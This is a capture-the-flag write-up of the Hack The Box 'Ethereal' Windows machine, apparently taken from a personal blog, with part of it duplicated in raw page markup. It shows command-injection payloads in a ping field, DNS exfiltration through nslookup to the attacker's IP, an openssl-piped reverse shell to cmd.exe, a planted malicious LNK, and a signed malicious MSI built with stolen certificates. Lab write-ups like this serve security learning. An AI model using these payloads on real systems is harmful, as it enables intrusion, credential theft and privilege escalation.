and the other on port 136 openssl s_server -key key.pen -cert certificate.pem -quiet -port [port] Read more about s_server We are setting up 2 servers because we are going to use openssl on the box to connect on port 73 and take our input , then we will pipe that input to cmd.exe then we will pipe the output to our server on port 136. Now we need to locate openssl.exe , if we listed the contents of OpenSSL-v1.1.0 in Program Files (x86) (can also be written Progra~2. check this) we will get this output : 10.10.xx.xx &amp; for /f &quot;tokens=1,2,3&quot; %a in (&#39;dir /B &quot;C:\\Program Files (x86)\\OpenSSL-v1.1.0&quot;&#39;) do nslookup %a.%b.%c 10.10.xx.xx We see a directory called bin that’s where openssl.exe is located so the path is c:\\progra~2\\OpenSSL-v1.1.0\\bin\\openssl.exe Now everything is ready , in the ping page we will write this : 10.10.xx.xx | &quot;C:\\Program Files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:73 | cmd.exe | &quot;C:\\Program Files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:136 Then we will check our server : Now we will write the commands on the first server (port 73) , then we will refresh the ping page , to send the post request again (this will pipe our input from port 73 to cmd.exe then to the server on port 136) then we will get our output on the second server. alan’s desktop doesn’t have the flag so we need to escalate to another user , there’s a note on alan’s desktop in a file called note-draft.txt: Creating a malicious lnk and getting User From the note we knew that there’s a lnk on Public’s desktop and other users on the box are using it. So if we replaced it with a payload we can get a shell as another user. There’s a tool on github called LNKup I used it to create the payload : To uplaod it we will close any one of the servers and run it again but this time we will redirect the lnk file to it : Then on the ping page we will type this : 10.10.xx.xx | &quot;C:\\Program Files (x86)\\OpenSSL-v1.1.0\\bin\\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:136 &gt; &quot;C:\\Users\\Public\\Desktop\\Shortcuts\\rick.lnk&quot; We will close the server , run the 2 servers and get our shell as alan like we did before , then we will delete the original lnk and copy ours with the name of the old lnk : del &quot;c:\\users\\public\\desktop\\shortcuts\\Visual Studio 2017.lnk&quot; &amp; copy &quot;c:\\users\\public\\desktop\\shortcuts\\rick.lnk&quot; &quot;c:\\users\\public\\desktop\\shortcuts\\Visual Studio 2017.lnk&quot; &amp; dir c:\\users\\public\\desktop\\shortcuts Then we will close the 2 servers , run them again and wait for someone to execute the lnk file , after a minute we will get a shell as jorge : With this we don’t need to refresh any pages because the connection is not handled by the ping page anymore so the command will be piped immediately from the first server to the second server. Finally we owned user ! More Filesystem Enumeration If we checked the other drives : fsutil fsinfo drives We will find that C is not the only drive and there’s also D. Unfortunately if someone started to enumerate without doing this important step in windows enumeration , they won’t get anything. Contents of D: In DEV there’s a directory called MSIs and it has a note : So we have to create a malicious msi and place it there to get a shell as rupal. We also need to get the certs to sign the msi , the certs are found in D:\\Certs , MyCA.cer and MyCA.pvk , to transfer them to our box we will use openssl to base64 encode the certs then we can copy and decode on our box. C:\\progra~2\\OpenSSL-v1.1.0\\bin\\openssl.exe base64 -in MyCA.cer C:\\progra~2\\OpenSSL-v1.1.0\\bin\\openssl.exe base64 -in MyCA.pvk Now we will go to a windows box again to create the msi Creating Malicious msi and getting root In order to create the msi we will use wixtools , you can use other msi builders but they didn’t work for me. Check this page for some wix msi usage examples. We will create an msi that executes our lnk file : &lt;?xml version=&quot;1.0&quot;?&gt; &lt;Wix xmlns=&quot;http://schemas.microsoft.com/wix/2006/wi&quot;&gt; &lt;Product Id=&quot;*&quot; UpgradeCode=&quot;12345678-1234-1234-1234-111111111111&quot; Name=&quot;Example Product Name&quot; Version=&quot;0.0.1&quot; Manufacturer=&quot;@_xpn_&quot; Language=&quot;1033&quot;&gt; &lt;Package InstallerVersion=&quot;200&quot; Compressed=&quot;yes&quot; Comments=&quot;Windows Installer Package&quot;/&gt; &lt;Media Id=&quot;1&quot; Cabinet=&quot;product.cab&quot; EmbedCab=&quot;yes&quot;/&gt; &lt;Directory Id=&quot;TARGETDIR&quot; Name=&quot;SourceDir&quot;&gt; &lt;Directory Id=&quot;ProgramFilesFolder&quot;&gt; &lt;Directory Id=&quot;INSTALLLOCATION&quot; Name=&quot;Example&quot;&gt; &lt;Component Id=&quot;ApplicationFiles&quot; Guid=&quot;12345678-1234-1234-1234-222222222222&quot;&gt; &lt;/Component&gt; &lt;/Directory&gt; &lt;/Directory&gt; &lt;/Directory&gt; &lt;Feature Id=&quot;DefaultFeature&quot; Level=&quot;1&quot;&gt; &lt;ComponentRef Id=&quot;ApplicationFiles&quot;/&gt; &lt;/Feature&gt; &lt;Property Id=&quot;cmdline&quot;&gt;cmd.exe /C &quot;c:\\users\\public\\desktop\\shortcuts\\rick.lnk&quot;&lt;/Property&gt; &lt;CustomAction Id=&quot;Stage1&quot; Execute=&quot;deferred&quot; Directory=&quot;TARGETDIR&quot; ExeCommand=&#39;[cmdline]&#39; Return=&quot;ignore&quot; Impersonate=&quot;yes&quot;/&gt; &lt;CustomAction Id=&quot;Stage2&quot; Execute=&quot;deferred&quot; Script=&quot;vbscript&quot; Return=&quot;check&quot;&gt; fail_here &lt;/CustomAction&gt; &lt;InstallExecuteSequence&gt; &lt;Custom Action=&quot;Stage1&quot; After=&quot;InstallInitialize&quot;&gt;&lt;/Custom&gt; &lt;Custom Action=&quot;Stage2&quot; Before=&quot;InstallFiles&quot;&gt;&lt;/Custom&gt; &lt;/InstallExecuteSequence&gt; &lt;/Product&gt; &lt;/Wix&gt; We will use candle.exe from wixtools to create a wixobject from msi.xml Then we will use light.exe to create the msi file from the wixobject After that we need tools from microsoft sdk to sign our msi , first we will use makecert.exe to create new certs from the original certs we got from the box makecert.exe -n &quot;CN=Ethereal&quot; -pe -cy end -ic c:\\tmp\\MyCA.cer -iv c:\\tmp\\MyCA.pvk -sky signature -sv c:\\tmp\\rick.pvk c:\\tmp\\rick.cer It will ask for a password we will leave it blank for no password protection : Then we will use pvk2pfx.exe to create a pfx for both the cer and the pvk files. pvk2pfx.exe -pvk c:\\tmp\\rick.pvk -spc c:\\tmp\\rick.cer -pfx c:\\tmp\\rick.pfx And finally we will use signtool.exe to sign the msi with the pfx signtool.exe sign /f c:\\tmp\\rick.pfx c:\\tmp\\ethereal\\rick.msi Now back to our kali we will upload the msi the same way we uploaded the lnk file before , and we also need to make sure that the lnk file is in c:\\users\\public\\desktop\\shortcuts\\ because the msi is just executing that lnk. We will put the msi into D:\\DEV\\MSIs Then we will close the servers , run them again and wait for around 3-5 minutes until rupal opens the msi And we got root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Access Next Hack The Box write-up : Hack The Box - Carrier","@type":"BlogPosting","url":"http://localhost:4000/hack-the-box/ethereal/","image":"http://localhost:4000/hackthebox/ethereal/0.png","headline":"Hack The Box - Ethereal","dateModified":"2019-03-09T00:00:00+02:00","datePublished":"2019-03-09T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/ethereal/"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/tagbuttons.css">
  <link rel="stylesheet" href="/assets/css/ad.css">
  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2');
</script>

<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a><a class="page-link" href="/tags/">Tags</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Hack The Box - Ethereal</h1>
    <p class="post-meta">
      <h7>
        Tags: 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Windows/';">Windows</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/ftp/';">ftp</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Web/';">Web</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/RCE/';">RCE</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Windows Exploitation/';">Windows Exploitation</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/firewall/';">firewall</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Networking/';">Networking</button> 
        
      </h7>
      <br>
      <time class="dt-published" datetime="2019-03-09T00:00:00+02:00" itemprop="datePublished">Mar 9, 2019
      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
</p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <hr />

<h3 id="quick-summary">Quick Summary</h3>
<h4 id="hey-guys-today-ethereal-retired-and-here-is-my-write-up-about-it-and-as-the-difficulty-says--its-insane--the-most-annoying-part-about-this-box-is-that-it-was-very-hard-to-enumerate-because-we-only-get-a-blind-rce-and-the-firewall-rules-made-it-even-harder-because-it-only-allowed-tcp-connection-for-2-ports-it-was-fun-and-annoying-at-the-same-time-but-i-liked-it-its-a-windows-box-and-its-ip-is-101010106-i-added-it-to-etchosts-as-etherealhtb--lets-jump-right-in-">Hey guys today Ethereal retired and here is my write-up about it. And as the difficulty says , It’s insane ! The most annoying part about this box is that it was very hard to enumerate because we only get a blind RCE and the firewall rules made it even harder because it only allowed TCP connection for 2 ports. It was fun and annoying at the same time but I liked it. It’s a Windows box and its ip is 10.10.10.106 I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">ethereal.htb</code> , Let’s jump right in !</h4>
<p><img src="/images/hackthebox/ethereal/0.png" alt="" /></p>
<hr />

<h3 id="nmap">Nmap</h3>
<h4 id="as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-">As always we will start with nmap to scan for open ports and services :</h4>
<p><code class="highlighter-rouge">nmap -sV -sT -sC ethereal.htb</code>
<img src="/images/hackthebox/ethereal/1.png" alt="" /></p>
<h4 id="and-we-get-ftp-on-port-21--http-on-port-80-and-8080-it-also-tells-us-that-ftp-anonymous-authentication-is-allowed-as-always-we-will-enumerate-http-first">And we get FTP on port 21 , HTTP on port 80 and 8080. It also tells us that FTP anonymous authentication is allowed. As always we will enumerate HTTP first.</h4>
<p><br /></p>
<hr />

<h3 id="http-initial-enumeration">HTTP Initial Enumeration</h3>
<h4 id="on-port-80-we-see-this-website-">On port 80 we see this website :</h4>
<p><img src="/images/hackthebox/ethereal/2.png" alt="" /></p>
<h4 id="the-only-interseting-thing-is-in-the-menu-we-see-an-admin-area-">The only interseting thing is in the menu we see an Admin-area :</h4>
<p><img src="/images/hackthebox/ethereal/3.png" alt="" /></p>
<h4 id="clicking-on-that-we-get-redirected-to-this-page-which-has-some-other-options-like-notes--messages--desktop-and-ping-">Clicking on that we get redirected to this page which has some other options like Notes , Messages , Desktop and Ping :</h4>
<p><img src="/images/hackthebox/ethereal/4.png" alt="" /></p>
<h4 id="by-going-to-notes-we-only-get-this-">By going to <code class="highlighter-rouge">notes</code> we only get this :</h4>
<p><img src="/images/hackthebox/ethereal/5.png" alt="" /></p>
<h4 id="so-now-we-know-that-theres-a-test-connection-page-somewhere--we-also-get-a-potential-username-alan-by-clicking-on-messages-we-get-nothing--but-desktop-">So now we know that there’s a “test connection” page somewhere , we also get a potential username <code class="highlighter-rouge">alan</code>. By clicking on <code class="highlighter-rouge">messages</code> we get nothing , but <code class="highlighter-rouge">desktop</code> :</h4>
<p><img src="/images/hackthebox/ethereal/6.png" alt="" /></p>
<h4 id="and-its-very-clear-that-this-is-fake--also-the-usertxt-is-a-troll-">And it’s very clear that this is fake , also the user.txt is a troll :</h4>
<p><img src="/images/hackthebox/ethereal/7.png" alt="" /></p>
<h4 id="by-clicking-on-ping-we-get-redirected-to-port-8080-which-asks-us-for-authentication-and-it-uses-http-basic-auth-">By clicking on <code class="highlighter-rouge">ping</code> we get redirected to port 8080 which asks us for authentication and it uses http basic auth :</h4>
<p><img src="/images/hackthebox/ethereal/8.png" alt="" /></p>
<h4 id="so-now-we-know-whats-on-port-8080--the-test-connection-page-but-we-need-credentials-to-access-it">So now we know what’s on port 8080 , the “Test Connection” page. But we need credentials to access it.</h4>
<h4 id="one-more-thing-to-check-is-sub-directory-enumeration-with-gobsuter-or-any-alternative-">One more thing to check is sub directory enumeration with gobsuter or any alternative :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster -u http://ethereal.htb -w /usr/share/wordlists/dirb/common.txt -t 100 -to 250s 
=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://ethereal.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 4m10s
=====================================================
2019/03/06 21:51:24 Starting gobuster
=====================================================
/corp (Status: 301)
</code></pre></div></div>
<h4 id="gobuster-only-found-corp-with-the-wordlist-usrsharewordlistsdirbcommontxt-and-thats-the-subdirectory-that-had-the-admin-stuff-we-cant-get-any-more-info-and-theres-nothing-to-exploit-so-next-thing-to-look-at-is-ftp">gobuster only found <code class="highlighter-rouge">/corp</code> with the wordlist <code class="highlighter-rouge">/usr/share/wordlists/dirb/common.txt</code> and that’s the subdirectory that had the admin stuff. We can’t get any more info and there’s nothing to exploit so next thing to look at is FTP</h4>
<p><br /></p>
<hr />

<h3 id="ftp-enumeration">FTP Enumeration</h3>
<h4 id="on-ftp-there-are-some-files-but-the-most-interesting-ones-are-fdiskzip-and-diskzip-so-we-will-check-them-first-">On FTP there are some files but the most interesting ones are <code class="highlighter-rouge">FDISK.zip</code> and <code class="highlighter-rouge">DISK.zip</code> so we will check them first :</h4>
<p><img src="/images/hackthebox/ethereal/9.png" alt="" /></p>
<h4 id="we-will-unzip-them-">We will <code class="highlighter-rouge">unzip</code> them :</h4>
<p><img src="/images/hackthebox/ethereal/10.png" alt="" /></p>
<h4 id="then-we-will-check-what-kind-of-files-do-we-have-with-file-">Then we will check what kind of files do we have with <code class="highlighter-rouge">file</code> :</h4>
<p><img src="/images/hackthebox/ethereal/11.png" alt="" /></p>
<h4 id="most-likely-they-are-mountable-disks-so-we-will-create-a-directory-to-mount-them-and-call-it-mnt-then-we-will-make-a-directory-for-disk1--disk2-and-fdisk-and-finally-we-will-mount-them-mount--o-loop-disk-directory-">Most likely they are mountable disks so we will create a directory to mount them and call it <code class="highlighter-rouge">mnt</code> then we will make a directory for <code class="highlighter-rouge">disk1</code> , <code class="highlighter-rouge">disk2</code> and <code class="highlighter-rouge">fdisk</code> and finally we will mount them <code class="highlighter-rouge">mount -o loop [Disk] [Directory]</code> :</h4>
<p><img src="/images/hackthebox/ethereal/12.png" alt="" /></p>
<h4 id="in-disk1-and-disk2-there-are-some-files-that-are-not-very-interesting-">In <code class="highlighter-rouge">disk1</code> and <code class="highlighter-rouge">disk2</code> there are some files that are not very interesting :</h4>
<p><img src="/images/hackthebox/ethereal/13.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/ethereal/14.png" alt="" /></p>
<h4 id="but-on-fdisk-theres-a-directory-called-pbox-">But on fdisk there’s a directory called <code class="highlighter-rouge">pbox</code> :</h4>
<p><img src="/images/hackthebox/ethereal/15.png" alt="" /></p>
<h4 id="it-contains-an-executable-called-pboxexe-and-a-dat-file-called-pboxdat-">It contains an executable called <code class="highlighter-rouge">pbox.exe</code> and a dat file called <code class="highlighter-rouge">pbox.dat</code> :</h4>
<p><img src="/images/hackthebox/ethereal/16.png" alt="" /></p>
<hr />

<h3 id="getting-credentials">Getting Credentials</h3>
<h4 id="we-will-switch-to-a-windows-box-to-run-that-executable--you-can-alternatively-use-wine-or-a-program-called-dosbox-wine-didnt-work-for-me-and-dosbox-kept-crashing-every-15-seconds">We will switch to a windows box to run that executable , you can alternatively use <code class="highlighter-rouge">wine</code> or a program called <code class="highlighter-rouge">dosbox</code>. <code class="highlighter-rouge">wine</code> didn’t work for me and <code class="highlighter-rouge">dosbox</code> kept crashing every 15 seconds.</h4>
<p><img src="/images/hackthebox/ethereal/17.png" alt="" /></p>
<h4 id="when-we-try-to-open-it-it-asks-for-a-password-">When we try to open it it asks for a password :</h4>
<p><img src="/images/hackthebox/ethereal/18.png" alt="" /></p>
<h4 id="at-this-point-the-only-option-i-had-was-to-guess-the-password-because-i-didnt-know-how-to-bruteforce-the-password-in-this-case--however-the-password-was-password-d--so-no-bruteforce-is-needed-its-only-a-quick-guess--after-we-get-in--we-see-this-password-database-">At this point the only option I had was to guess the password because I didn’t know how to bruteforce the password in this case , however the password was “password” :D , so no bruteforce is needed it’s only a quick guess , after we get in , we see this password database :</h4>
<p><img src="/images/hackthebox/ethereal/19.png" alt="" /></p>
<h4 id="databases-">databases :</h4>
<p><img src="/images/hackthebox/ethereal/20.png" alt="" /></p>
<h4 id="msdn-">msdn :</h4>
<p><img src="/images/hackthebox/ethereal/21.png" alt="" /></p>
<h4 id="learning-">learning :</h4>
<p><img src="/images/hackthebox/ethereal/22.png" alt="" /></p>
<h4 id="ftp-drop-">ftp drop :</h4>
<p><img src="/images/hackthebox/ethereal/23.png" alt="" /></p>
<h4 id="backup-">backup :</h4>
<p><img src="/images/hackthebox/ethereal/24.png" alt="" /></p>
<h4 id="website-uploads-">website uploads :</h4>
<p><img src="/images/hackthebox/ethereal/25.png" alt="" /></p>
<h4 id="truecrypt-">truecrypt :</h4>
<p><img src="/images/hackthebox/ethereal/26.png" alt="" /></p>
<h4 id="management-server-">management server :</h4>
<p><img src="/images/hackthebox/ethereal/27.png" alt="" /></p>
<h4 id="svn-">svn :</h4>
<p><img src="/images/hackthebox/ethereal/28.png" alt="" /></p>
<h4 id="back-to-our-kali--now-we-can-create-a-list-with-all-the-information-we-got-">Back to our kali , now we can create a list with all the information we got :</h4>
<p><img src="/images/hackthebox/ethereal/29.png" alt="" /></p>
<h4 id="i-put-the-passwords-in-a-separate-list-to-bruteforce-the-http-auth-with-it-">I put the passwords in a separate list to bruteforce the http auth with it :</h4>
<p><img src="/images/hackthebox/ethereal/30.png" alt="" /></p>
<h4 id="we-will-use-wfuzz-and-we-will-try-the-username-alan-first-">We will use <code class="highlighter-rouge">wfuzz</code> and we will try the username <code class="highlighter-rouge">alan</code> first :</h4>
<p><code class="highlighter-rouge">wfuzz -u http://ethereal.htb:8080 --basic alan:FUZZ -w passwords.txt</code>
<img src="/images/hackthebox/ethereal/31.png" alt="" /></p>
<h4 id="password--c414m17y57r1k3s4g41n">Password : <code class="highlighter-rouge">!C414m17y57r1k3s4g41n!</code></h4>
<p><br /></p>
<hr />

<h3 id="blind-rce">Blind RCE</h3>
<h4 id="now-after-we-login-we-get-the-test-connection-page-and-we-have-an-input-for-the-ip-address-to-ping">Now after we login we get the “Test Connection” page and we have an input for the ip address to ping.</h4>
<p><img src="/images/hackthebox/ethereal/32.png" alt="" /></p>
<h4 id="now-we-can-try-to-bypass-that-and-inject-system-commands-using--or---but-we-dont-get-any-output-i-also-tried-to-host-ncexe-on-a-python-http-server-and-used-certutil-to-download-it-but-the-python-server-didnt-get-any-requests-finally-when-i-ran-responder-responder--i-tun0-then-did-this-1010xxxx--nslookup-test-1010xxxx">Now we can try to bypass that and inject system commands using <code class="highlighter-rouge">&amp;</code> or <code class="highlighter-rouge">|</code> , but we don’t get any output. I also tried to host <code class="highlighter-rouge">nc.exe</code> on a python http server and used <code class="highlighter-rouge">certutil</code> to download it but the python server didn’t get any requests. Finally when I ran responder <code class="highlighter-rouge">responder -I tun0</code> then did this <code class="highlighter-rouge">10.10.xx.xx &amp; nslookup test 10.10.xx.xx</code></h4>
<p><img src="/images/hackthebox/ethereal/33.png" alt="" /></p>
<h4 id="i-finally-got-something-">I finally got something :</h4>
<p><img src="/images/hackthebox/ethereal/34.png" alt="" /></p>
<h4 id="we-can-try-to-execute-a-system-command-and-get-the-output-by-doing-this-">We can try to execute a system command and get the output by doing this :</h4>
<p><code class="highlighter-rouge">10.10.xx.xx &amp; for /f %i in ('whoami') do nslookup %i 10.10.xx.xx</code>
<img src="/images/hackthebox/ethereal/35.png" alt="" /></p>
<h4 id="this-is-executing-whoami-then-taking-the-output-and-doing-nslookup-with-the-output-to-our-ip-">This is executing <code class="highlighter-rouge">whoami</code> then taking the output and doing nslookup with the output to our ip :</h4>
<p><img src="/images/hackthebox/ethereal/36.png" alt="" /></p>
<h4 id="we-get-etherealalan-and-thats-unusual-as-we-expected-etherealalan">We get <code class="highlighter-rouge">etherealalan</code> and that’s unusual as we expected <code class="highlighter-rouge">ethereal\alan</code>.</h4>
<h4 id="we-will-start-enumerating-the-filesystem-this-way--read-this-if-you-dont-understand-some-of-the-for-commands-that-we-will-use">We will start enumerating the filesystem this way , <a href="https://ss64.com/nt/for_f.html">read this</a> if you don’t understand some of the <code class="highlighter-rouge">for</code> commands that we will use.</h4>
<p><code class="highlighter-rouge">10.10.xx.xx &amp; for /f %i in ('cd') do nslookup %i 10.10.xx.xx</code>
<img src="/images/hackthebox/ethereal/37.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/ethereal/38.png" alt="" /></p>
<h4 id="so-the-current-directory-is-cwindowssystem32inetsrv">So the current directory is <code class="highlighter-rouge">c:\windows\system32\inetsrv</code></h4>
<h4 id="we-also-need-to-know-the-users-on-the-box-">We also need to know the users on the box :</h4>
<p><code class="highlighter-rouge">10.10.xx.xx &amp; for /f "tokens=1,2,3" %a in ('dir /B "C:\Users"') do nslookup %a.%b.%c 10.10.xx.xx</code>
<img src="/images/hackthebox/ethereal/39.png" alt="" /></p>
<h4 id="we-have-5-users-on-the-box-alan--jorge--public--rupal-and-administrator-we-are-executing-commands-as-alan">We have 5 users on the box <code class="highlighter-rouge">alan</code> , <code class="highlighter-rouge">jorge</code> , <code class="highlighter-rouge">Public</code> , <code class="highlighter-rouge">rupal</code> and <code class="highlighter-rouge">Administrator</code>. We are executing commands as <code class="highlighter-rouge">alan</code></h4>
<h4 id="next-thing-to-look-at-is-the-installed-programs-">Next thing to look at is the installed programs :</h4>
<p><code class="highlighter-rouge">10.10.xx.xx &amp; for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)"') do nslookup %a.%b.%c 10.10.xx.xx</code> 
<img src="/images/hackthebox/ethereal/40.png" alt="" /></p>
<h4 id="we-notice-that-openssl-is-installed-which-is-unusual--we-also-need-to-know-why-cant-we-make-the-box-connect-back-to-us-so-we-will-check-the-firewall-rules-in-our-case-the-easiest-way-to-do-this-is-to-execute-the-command-and-only-look-for-the-string-rule-name-then-redirect-that-output-to-a-file--and-read-that-file-like-we--are-doing-but-first-we-need-to-find-a-place-that-we-can-write-to-after-some-attempts-i-could-write-to-cuserspublicdesktopshortcuts--so-we-will-do-this-">We notice that OpenSSL is installed which is unusual , we also need to know why can’t we make the box connect back to us so we will check the firewall rules. In our case the easiest way to do this is to execute the command and only look for the string <code class="highlighter-rouge">Rule Name:</code> then redirect that output to a file , and read that file like we  are doing. But first we need to find a place that we can write to. After some attempts I could write to <code class="highlighter-rouge">c:\users\public\desktop\shortcuts</code> , so we will do this :</h4>
<p><code class="highlighter-rouge">10.10.xx.xx &amp; netsh advfirewall firewall show rule name=all | findstr "Rule Name:" &gt; C:\Users\Public\Desktop\Shortcuts\firewall.txt</code></p>
<h4 id="then-we-will-list-the-contents-of-cuserspublicdesktopshortcuts">Then we will list the contents of <code class="highlighter-rouge">c:\users\public\desktop\shortcuts</code></h4>
<p><code class="highlighter-rouge">10.10.xx.xx &amp; for /f "tokens=1,2,3" %a in ('dir /B "C:\Users\Public\Desktop\Shortcuts"') do nslookup %a.%b.%c 10.10.xx.xx</code>
<img src="/images/hackthebox/ethereal/41.png" alt="" /></p>
<h4 id="and-we-see-that-we-have-successfully-written-into-that-directory--next-step-is-to-read-the-file-">And we see that we have successfully written into that directory , next step is to read the file :</h4>
<p><code class="highlighter-rouge">10.10.xx.xx &amp; for /f "tokens=1,2,3,4,5,6,7" %a in ('type C:\Users\Public\Desktop\Shortcuts\firewall.txt') do nslookup %a.%b.%c.%d.%e.%f.%g 10.10.xx.xx</code>
<img src="/images/hackthebox/ethereal/42.png" alt="" /></p>
<h4 id="its-only-allowing-tcp-conections-to-port-73-and-136--we-saw-earlier-that-openssl-was-installed-on-the-box--we-can-create-a-ssltls-server-on-these-ports-and-use-openssl-to-make-the-box-connect-back-to-us">It’s only allowing TCP conections to port <code class="highlighter-rouge">73</code> and <code class="highlighter-rouge">136</code> , we saw earlier that openssl was installed on the box , we can create a <code class="highlighter-rouge">SSL/TLS server</code> on these ports and use openssl to make the box connect back to us.</h4>
<p><br /></p>
<hr />

<h3 id="generating-certs-and-setting-up-the-server">Generating certs and setting up the server</h3>
<h4 id="first-step-is-to-generate-certificates-because-we-need-them-to-set-up-the-server">First step is to generate certificates because we need them to set up the server</h4>
<p><code class="highlighter-rouge">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out certificate.pem -days 365 -nodes</code>
<img src="/images/hackthebox/ethereal/43.png" alt="" /></p>
<h4 id="then-we-will-split-our-terminal-and-run-2-servers--one-on-port-73-and-the-other-on-port-136">Then we will split our terminal and run 2 servers , one on port 73 and the other on port 136</h4>
<p><code class="highlighter-rouge">openssl s_server -key key.pen -cert certificate.pem -quiet -port [port]</code>
<img src="/images/hackthebox/ethereal/44.png" alt="" /></p>
<h4 id="read-more-about-s_server"><a href="https://www.openssl.org/docs/man1.0.2/man1/openssl-s_server.html">Read more about s_server</a></h4>
<h4 id="we-are-setting-up-2-servers-because-we-are-going-to-use-openssl-on-the-box-to-connect-on-port-73-and-take-our-input--then-we-will-pipe-that-input-to-cmdexe-then-we-will-pipe-the-output-to-our-server-on-port-136">We are setting up 2 servers because we are going to use openssl on the box to connect on port 73 and take our input , then we will pipe that input to cmd.exe then we will pipe the output to our server on port 136.</h4>
<h4 id="now-we-need-to-locate-opensslexe--if-we-listed-the-contents-of-openssl-v110-in-program-files-x86-can-also-be-written-progra2-check-this-we-will-get-this-output-">Now we need to locate openssl.exe , if we listed the contents of <code class="highlighter-rouge">OpenSSL-v1.1.0</code> in <code class="highlighter-rouge">Program Files (x86)</code> (can also be written <code class="highlighter-rouge">Progra~2</code>. check <a href="https://stackoverflow.com/questions/892555/how-do-i-specify-c-program-files-without-a-space-in-it-for-programs-that-cant/892568">this</a>) we will get this output :</h4>
<p><code class="highlighter-rouge">10.10.xx.xx &amp; for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)\OpenSSL-v1.1.0"') do nslookup %a.%b.%c 10.10.xx.xx</code>
<img src="/images/hackthebox/ethereal/45.png" alt="" /></p>
<h4 id="we-see-a-directory-called-bin-thats-where-opensslexe-is-located-so-the-path-is-cprogra2openssl-v110binopensslexe">We see a directory called <code class="highlighter-rouge">bin</code> that’s where <code class="highlighter-rouge">openssl.exe</code> is located so the path is <code class="highlighter-rouge">c:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe</code></h4>
<h4 id="now-everything-is-ready--in-the-ping-page-we-will-write-this-">Now everything is ready , in the ping page we will write this :</h4>
<p><code class="highlighter-rouge">10.10.xx.xx | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.xx.xx:73 | cmd.exe | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.xx.xx:136</code></p>
<h4 id="then-we-will-check-our-server-">Then we will check our server :</h4>
<p><img src="/images/hackthebox/ethereal/46.png" alt="" /></p>
<h4 id="now-we-will-write-the-commands-on-the-first-server-port-73--then-we-will-refresh-the-ping-page--to-send-the-post-request-again-this-will-pipe-our-input-from-port-73-to-cmdexe-then-to-the-server-on-port-136-then-we-will-get-our-output-on-the-second-server">Now we will write the commands on the first server (port 73) , then we will refresh the ping page , to send the post request again (this will pipe our input from port 73 to cmd.exe then to the server on port 136) then we will get our output on the second server.</h4>
<p><img src="/images/hackthebox/ethereal/47.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/ethereal/48.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/ethereal/49.png" alt="" /></p>
